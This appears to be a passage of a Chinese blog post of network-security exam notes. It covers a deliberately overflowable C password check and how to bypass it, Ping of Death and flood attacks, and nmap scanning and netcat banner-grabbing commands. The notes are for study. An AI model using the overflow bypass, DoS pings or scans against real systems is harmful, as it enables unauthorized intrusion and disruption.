+<li>数据段:已初始化(.data)和未初始化(.bss),编译时分配</li>
+<li>堆栈段：堆(Heap)+栈(Stack)<br>堆：大小不固定，可动态扩张/缩减。堆内存释放由应用程序控制。<br>栈：运行时按需分配，先进后出。PUSH压栈，POP出栈。</li>
+</ul>
+<p>堆栈区别：</p>
+<ul>
+<li>分配和管理方式不同</li>
+<li>产生碎片不同</li>
+<li>生长方向不同</li>
+</ul>
+<ol>
+<li>file offset:数据在PE文件中相对文件开头的偏移</li>
+<li>Image Base:PE文件装入虚拟内存基地址</li>
+<li>VA:PE文件指令被装入虚拟内存后的地址</li>
+<li>RVA：VA相对于基址的偏移量</li>
+<li>VA=Image Base + RVA</li>
+</ol>
+<p><code>file offset = RVA - section offset= VA - Image base - section offset</code></p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出:"></a>栈溢出:</h2><p>ESP(extended stack pointer)：系统栈最上面栈帧的栈顶<br>EBP：系统栈最上面栈帧的栈底<br>EIP：指向下一条等待执行的指令地址</p>
+<p>函数调用参数入栈顺序：<br>VC —_cdecl方式(由右至左) </p>
+<p>函数入栈步骤：<br>参数入栈、返回地址入栈、代码区跳转、栈帧调整。</p>
+<p>调用指令：</p>
+<pre><code>push 参数2
+push 参数1
+call 函数地址(保存返回地址；跳转到调用函数入口)
+push ebp;
+move ebp,esp
+sub esp,xxx 分配XXX字节栈区空间
+</code></pre><p>overflow基于下图去理解<br>代码如下：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#define PASSWORD &quot;1234567&quot;
+
+int verify_password(char *password)
+{
+int authenticated;
+char buffer[8];
+authenticated=strcmp(password,PASSWORD);
+strcpy(buffer,password);
+return authenticated;    
+}
+
+main()
+{
+int valid_flag=0;
+char password[1024];
+while(1)
+{
+    printf(&quot;please input password:      &quot;);
+    scanf(&quot;%s&quot;,password);
+    valid_flag=verify_password(password);
+    if(valid_flag)
+    {
+        printf(&quot;incorrect password!\n\n&quot;);
+    }else
+    {
+        printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+        break;
+    }
+}
+}
+</code></pre><p><img src="https://i.imgur.com/padWTTf.png" alt=""><br>overflow1:小于7个字符时，authenticated值为-1，补码表示0xffffffff,输入字符超过7个字符，authenticated值最低位恰好被覆盖为0，通过验证。<br>程序会崩溃。<br><img src="https://i.imgur.com/I70no6J.png" alt=""></p>
+<p>overflow2:将返回地址覆盖成验证通过的0x00401122,password文本输入，UltraEdit编辑，倒着输入0x00401122,通过验证，程序崩溃。</p>
+<p>原因:<br><strong>EBP被覆盖为无效值，程序在退出时堆栈无法平衡，导致崩溃。</strong></p>
+<h2 id="缓冲区溢出攻击的基本类型："><a href="#缓冲区溢出攻击的基本类型：" class="headerlink" title="缓冲区溢出攻击的基本类型："></a>缓冲区溢出攻击的基本类型：</h2><ul>
+<li>栈溢出</li>
+<li>堆溢出</li>
+<li>BSS溢出</li>
+<li>格式化串溢出</li>
+<li>整数溢出</li>
+</ul>
+<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>避免源码中的相关bug（）</li>
+<li>插入代码进行数组边界检查、 返回指针完整性检查</li>
+<li>阻止攻击代码执行(非执行缓冲区技术、堆栈数据段不可执行)</li>
+<li>加强系统防护（GS机制、SafeSEH、DEP）</li>
+</ol>
+<h1 id="第七章拒绝服务"><a href="#第七章拒绝服务" class="headerlink" title="第七章拒绝服务"></a>第七章拒绝服务</h1><h2 id="0x01-DOS攻击"><a href="#0x01-DOS攻击" class="headerlink" title="0x01 DOS攻击"></a>0x01 DOS攻击</h2><ol>
+<li>概念：破坏性攻击，通过消耗可用系统资源、带宽资源或造成程序缓冲区溢出错误，致使系统无法正常服务。</li>
+<li>类型:网络带宽攻击、连通性攻击、滥用合理的服务请求、利用传输协议缺陷、利用服务程序的漏洞</li>
+</ol>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>1.Ping of Death</p>
+<p>缓存溢出： ping -l 65540 192.168.1.140</p>
+<p>2.泪滴（Teardrop）</p>
+<p>分片攻击，数据分片后传送到目标主机后再到堆栈中进行重组。</p>
+<p>3.泛洪类（Flood）<br>UDP泛洪： 利用主机自动回复的服务(echo、chargen),一方的输出成为另一方的输入。</p>
+<pre><code>SYN泛洪：利用TCP协议缺陷，发送大量伪造的TCP连接请求。
+ACK泛洪
+Connection泛洪
+HTTP Get 泛洪
+</code></pre><p>4.Land攻击(源地址和目标地址相同)<br>5.Smurf攻击(源为攻击主机地址，目的为广播地址，ICMP )<br>6.Fraggle攻击(Smurf区别为UDP)<br>7.畸形消息攻击<br>8.Slashdot effect<br>9.WinNuke攻击（攻击目标端口）  </p>
+<h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>SYN防御：缩短SYN Timeout时间、设置SYN Cookie、负反馈策略、退让策略、退让策略、 防火墙</p>
+<p>拒绝服务攻击的防御困难之处——不容易定位攻击者。</p>
+<p>防御方法： 有效完善的设计、带宽限制、及时给系统安装补丁、运行尽可能少的服务、只允许必要的通信、封锁敌意IP地址</p>
+<h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS原理：通过控制分布在网络各处的数百甚至数万台傀儡主机（肉机），<br>发动它们同时向攻击目标进行DoS攻击。</p>
+<h1 id="第八章身份认证"><a href="#第八章身份认证" class="headerlink" title="第八章身份认证"></a>第八章身份认证</h1><h2 id="AAA"><a href="#AAA" class="headerlink" title="AAA"></a>AAA</h2><ul>
+<li>认证：在做任何动作之前必须要识别动作执行者的真实身份。又称为鉴别、确认。</li>
+<li>授权：用户身份被确认合法后，赋予该用户进行文件和数据等的操作权限</li>
+<li>审计/记账：每一个人都应该为自己所做的操作负责，所以在做完<br>事情之后都要留下记录，以便核查责任</li>
+</ul>
+<h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><ul>
+<li>简单口令认证</li>
+<li>基于单向函数的口令认证</li>
+</ul>
+<ul>
+<li>一次性口令认证<br>防止重放攻击；基于客户端/服务器模式；</li>
+</ul>
+<ol>
+<li>连接请求</li>
+<li>返回seed,seq(服务器seq-1)</li>
+<li>输入口令，口令+seed做seq次hash；</li>
+<li>服务器存储用户上次登录得一次性口令，hash依次比较，一致通过，覆盖口令</li>
+</ol>
+<h1 id="第九章VPN"><a href="#第九章VPN" class="headerlink" title="第九章VPN"></a>第九章VPN</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>VPN是在公共网络上传输私有通信的方法。VPN通常使用（加密的）隧道将两个或多个专用网络连接起来。</p>
+<h2 id="层次和类型"><a href="#层次和类型" class="headerlink" title="层次和类型"></a>层次和类型</h2><p><img src="https://i.imgur.com/C8f4S3m.png" alt=""></p>
+<h2 id="隧道协议"><a href="#隧道协议" class="headerlink" title="隧道协议"></a>隧道协议</h2><p><img src="https://i.imgur.com/dJouaKB.png" alt=""><br><img src="https://i.imgur.com/G8bPgEX.png" alt=""></p>
+<h2 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h2><p>概念：用于构建VPN的一系列协议。为提供加密安全服务而开发，支持认证、完整性、访问控制以及数据一致性。只允许IP数据的封装和加密。</p>
+<p>组成：</p>
+<ul>
+<li>Internet密钥交换协议（IKE）</li>
+<li>封装协议<ol>
+<li>负载安全封装</li>
+<li>认证报头协议<br><img src="https://i.imgur.com/ZdSOJCX.png" alt=""></li>
+</ol>
+</li>
+</ul>
+<h1 id="第十章防火墙"><a href="#第十章防火墙" class="headerlink" title="第十章防火墙"></a>第十章防火墙</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>防火墙(firewall)是位于两个(或<br>多个)网络间实施网间访问控制的组件的集合</li>
+<li><p>防火墙通常是单独的计算机、路由器或专有硬件设备，充当访问网络的唯一入口点</p>
+</li>
+<li><p>防火墙实现数据流控制通过预先设定安全规则来实现，安全规则由匹配条件和处理方式两部分组成。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>使用对象分类:</p>
+</li>
+<li><p>个人防火墙</p>
+</li>
+<li><p>企业防火墙<br>技术分类：</p>
+</li>
+<li><p>包过滤防火墙(静态包和动态包)</p>
+</li>
+<li>代理技术（应用层代理和电路级网关）</li>
+<li>混和型防火墙</li>
+</ul>
+<hr>
+<p>后续实践</p>
+<h1 id="扫描-1"><a href="#扫描-1" class="headerlink" title="扫描"></a>扫描</h1><p>whois 163.com</p>
+<p>nslookup<br>server dns.cumt.edu.cn   //指定域名服务器<br>set class=any  //设置类型<br>cs.cumt.edu.cn //查询主机host</p>
+<p>dig 163.com    //域名解析</p>
+<p>firece dns cumt.edu.cn   //dns扫描</p>
+<p>host 163.com  //  ip-主机名</p>
+<p>tracert 163.com    //路由追踪</p>
+<h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><pre><code>nmap -sP 目标阻断ICMP包可换 TCP进行ping  nmap -PT 80
+</code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>主动连接目标系统的TCP和UDP端口以确定哪些服务正在运行或处于LISTENING（监听）状态。</p>
+<pre><code>- TCP Connect()扫描;nmap -sT
+- TCP SYN扫描(半开扫描;nmap -sS)：向目标端口送SYN数据包 
+- TCP FIN扫描(秘密扫描;nmap -sF): 向目标端口发送FIN数据包(-xX -sN)
+- TCP ACK扫描(nmap -sA),测试防火墙的规则集, 不能用来确定端口是否开放或者关闭
+- TCP窗口扫描(nmap -sW): 测试特定目标系统（如AIX和FreeBSD系统）上的端口是否开放、被过滤
+- TCP Maimon扫描(nmap -sM) ：探测报文改为FIN/ACK外，其原理与TCP FIN扫描一样；无论端口是否开放，都应响应RST报文
+-  UDP扫描(nmap -sU) ：向目标端口发出UDP数据包
+-  激进扫描 ： nmap –A 控制时间：nmap –T(0-5) 
+</code></pre><h2 id="旗标抓取-1"><a href="#旗标抓取-1" class="headerlink" title="旗标抓取"></a>旗标抓取</h2><pre><code>telnet www.cumt.edu.cn 80
+nc -v 163.com 80
+</code></pre><h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><pre><code>su su -
+passwd
+</code></pre><h3 id="修改文件权限："><a href="#修改文件权限：" class="headerlink" title="修改文件权限："></a>修改文件权限：</h3><pre><code>chmod 777 file/chmod a=rwx file  
+chmod ug=rwx,o=x file/chmod 771 file  
+</code></pre><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p>
+<h3 id="修改用户账户"><a href="#修改用户账户" class="headerlink" title="修改用户账户"></a>修改用户账户</h3><pre><code>usermod [-LU][-c &lt;备注&gt;][-d &lt;登入目录&gt;][-e &lt;有效期限&gt;][-f &lt;缓冲天数&gt;][-g &lt;群组&gt;][-G &lt;群组&gt;][-l &lt;帐号名称&gt;][-s &lt;shell&gt;][-u &lt;uid&gt;][用户帐号]
+</code></pre><p>更改登录目录</p>
+<pre><code>usermod -d /home/hnlinux root
+</code></pre><p>改变用户的uid</p>
+<pre><code>usermod -u 777 root
+</code></pre><h1 id="欺骗"><a href="#欺骗" class="headerlink" title="欺骗"></a>欺骗</h1><pre><code>arp -a //缓存表
+arp -s 192.168.1.254 00-0f-7a-02-00-4b //设置静态
+</code></pre>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Jason_xi</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/11/14/网络安全复习/">http://yoursite.com/2018/11/14/网络安全复习/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/11/14/网络安全复习/">November 14th 2018, 6:16:41 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/11/14/网络安全复习/">November 25th 2018, 3:38:26 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/23/算法复习/" title= "算法复习">
+                    <div class="nextTitle">算法复习</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/13/南邮/" title= "南邮CTF">
+                    <div class="prevTitle">南邮CTF</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:15896427883@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//https://github.com/08163182" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//https://www.zhihu.com/people/wang-jia-xi-5" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概论"><span class="toc-number">1.</span> <span class="toc-text">概论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安全主要威胁"><span class="toc-number">1.1.</span> <span class="toc-text">安全主要威胁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CIA三元组"><span class="toc-number">1.2.</span> <span class="toc-text">CIA三元组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网络攻击类型"><span class="toc-number">1.3.</span> <span class="toc-text">网络攻击类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全属性分5类"><span class="toc-number">1.3.1.</span> <span class="toc-text">安全属性分5类:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击方式"><span class="toc-number">1.3.2.</span> <span class="toc-text">攻击方式:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSI安全体系："><span class="toc-number">1.4.</span> <span class="toc-text">OSI安全体系：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5类安全服务"><span class="toc-number">1.4.1.</span> <span class="toc-text">5类安全服务:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8种安全机制："><span class="toc-number">1.4.2.</span> <span class="toc-text">8种安全机制：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一章-攻击流程和渗透测试"><span class="toc-number">2.</span> <span class="toc-text">第一章 攻击流程和渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#黑客攻击流程"><span class="toc-number">2.1.</span> <span class="toc-text">黑客攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搜索引擎技巧"><span class="toc-number">2.2.</span> <span class="toc-text">搜索引擎技巧:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试七个阶段："><span class="toc-number">2.3.</span> <span class="toc-text">渗透测试七个阶段：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#踩点"><span class="toc-number">2.4.</span> <span class="toc-text">踩点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">2.5.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#途径"><span class="toc-number">2.6.</span> <span class="toc-text">途径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#扫描"><span class="toc-number">2.7.</span> <span class="toc-text">扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查点"><span class="toc-number">2.8.</span> <span class="toc-text">查点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-1"><span class="toc-number">2.9.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造成原因"><span class="toc-number">2.10.</span> <span class="toc-text">造成原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#旗标抓取"><span class="toc-number">2.10.1.</span> <span class="toc-text">旗标抓取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二章网络嗅探"><span class="toc-number">3.</span> <span class="toc-text">第二章网络嗅探</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第三章口令破解与防御"><span class="toc-number">4.</span> <span class="toc-text">第三章口令破解与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#命令功能及使用"><span class="toc-number">4.1.</span> <span class="toc-text">命令功能及使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第四章欺骗技术与防御"><span class="toc-number">5.</span> <span class="toc-text">第四章欺骗技术与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-IP欺骗"><span class="toc-number">5.1.</span> <span class="toc-text">0x01 IP欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-number">5.1.1.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后果"><span class="toc-number">5.1.2.</span> <span class="toc-text">后果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御"><span class="toc-number">5.1.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP欺骗"><span class="toc-number">5.2.</span> <span class="toc-text">ARP欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后果-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">后果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御-1"><span class="toc-number">5.2.3.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第五章Web欺骗与防御"><span class="toc-number">6.</span> <span class="toc-text">第五章Web欺骗与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入攻击原理"><span class="toc-number">6.1.</span> <span class="toc-text">SQL注入攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击-2"><span class="toc-number">6.1.1.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御-2"><span class="toc-number">6.1.2.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">6.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-3"><span class="toc-number">6.3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#防御-3"><span class="toc-number">6.3.1.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第六章缓冲区溢出漏洞"><span class="toc-number">7.</span> <span class="toc-text">第六章缓冲区溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#缓冲区溢出原理"><span class="toc-number">7.1.</span> <span class="toc-text">缓冲区溢出原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">7.2.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-number">7.3.</span> <span class="toc-text">栈溢出:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#缓冲区溢出攻击的基本类型："><span class="toc-number">7.4.</span> <span class="toc-text">缓冲区溢出攻击的基本类型：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-4"><span class="toc-number">7.5.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第七章拒绝服务"><span class="toc-number">8.</span> <span class="toc-text">第七章拒绝服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DOS攻击"><span class="toc-number">8.1.</span> <span class="toc-text">0x01 DOS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">8.2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-5"><span class="toc-number">8.3.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDOS"><span class="toc-number">8.4.</span> <span class="toc-text">DDOS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第八章身份认证"><span class="toc-number">9.</span> <span class="toc-text">第八章身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AAA"><span class="toc-number">9.1.</span> <span class="toc-text">AAA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#身份认证"><span class="toc-number">9.1.1.</span> <span class="toc-text">身份认证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第九章VPN"><span class="toc-number">10.</span> <span class="toc-text">第九章VPN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#概念"><span class="toc-number">10.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#层次和类型"><span class="toc-number">10.2.</span> <span class="toc-text">层次和类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隧道协议"><span class="toc-number">10.3.</span> <span class="toc-text">隧道协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPSec"><span class="toc-number">10.4.</span> <span class="toc-text">IPSec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第十章防火墙"><span class="toc-number">11.</span> <span class="toc-text">第十章防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-2"><span class="toc-number">11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-number">11.2.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#扫描-1"><span class="toc-number">12.</span> <span class="toc-text">扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#主机扫描"><span class="toc-number">12.1.</span> <span class="toc-text">主机扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描"><span class="toc-number">12.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#旗标抓取-1"><span class="toc-number">12.3.</span> <span class="toc-text">旗标抓取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码修改"><span class="toc-number">12.3.1.</span> <span class="toc-text">密码修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改文件权限："><span class="toc-number">12.3.2.</span> <span class="toc-text">修改文件权限：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改用户账户"><span class="toc-number">12.3.3.</span> <span class="toc-text">修改用户账户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#欺骗"><span class="toc-number">13.</span> <span class="toc-text">欺骗</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
